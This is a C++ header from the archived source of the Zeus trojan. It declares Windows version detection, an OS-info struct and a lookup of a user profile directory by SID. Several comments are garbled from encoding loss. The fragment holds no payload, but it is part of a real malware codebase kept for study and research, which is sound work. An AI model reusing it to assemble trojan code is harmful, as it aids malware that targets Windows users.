/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ OC.
*/
#pragma once

namespace OsEnv
{
  //Version of OS.
  enum
  {
    VERSION_UNKNOWN,
    VERSION_2000,
    VERSION_XP,
    VERSION_S2003,
    VERSION_VISTA,
    VERSION_S2008,
    VERSION_SEVEN,
    VERSION_S2008R2
  };
  
  //Summary of the OC.
# pragma pack(push, 1)
  typedef struct
  {
    BYTE version;      //VERSION_ *.
    BYTE sp;           //Service Pack.
    WORD build;        //Build number.
    WORD architecture; //Arhitiktura processor.
  }OSINFO;
# pragma pack(pop)  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ������� ������ Windows.

    Return - VERSION_ *.
  */
  DWORD _getVersion(void);

  /*
    ��������� ������� ������ Windows.

    OUT oi - ������ Windows.
  */
  void _getVersionEx(OSINFO *oi);

  /*    Getting the user profile directory on the SID.

    IN sid - SID.
    OUT buffer - a buffer for the path must be at least MAX_PATH.

    Return - true - the path is successfully received,
                 false - the path has not been received.
  */
  bool _getUserProfileDirectoryhBySid(PSID sid, LPWSTR buffer);
};
